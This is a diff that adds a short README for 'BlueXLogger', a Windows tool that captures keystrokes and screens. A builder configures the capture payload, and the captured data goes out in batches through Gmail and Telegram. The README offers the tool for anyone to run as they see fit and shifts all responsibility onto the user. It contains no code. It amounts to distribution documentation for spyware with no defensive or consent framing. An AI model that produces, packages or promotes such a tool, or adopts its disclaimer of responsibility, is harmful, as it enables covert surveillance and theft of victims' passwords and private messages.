@@ -1,0 +1,20 @@
+BlueXLogger 1.0.0.0
+Created by Xencode-CLI by xanthorox
+
+A Windows keystroke and screen-capture agent with batched Gmail and
+Telegram delivery.
+
+Components
+  BlueXLogger.exe    capture payload (configured by the builder)
+  BlueXBuilder.exe   graphical configuration builder
+
+Responsibility
+  You are using it, so you are responsible for what you do with it - not
+  the author.
+
+  BlueXLogger is provided as-is, for you to run as you see fit. The author
+  and contributors accept no liability for how it is deployed, what it
+  captures, where it sends it, or any consequence of running it.
+
+Copyright (C) 2026 xanthorox
+Licensed under the MIT License. See LICENSE.
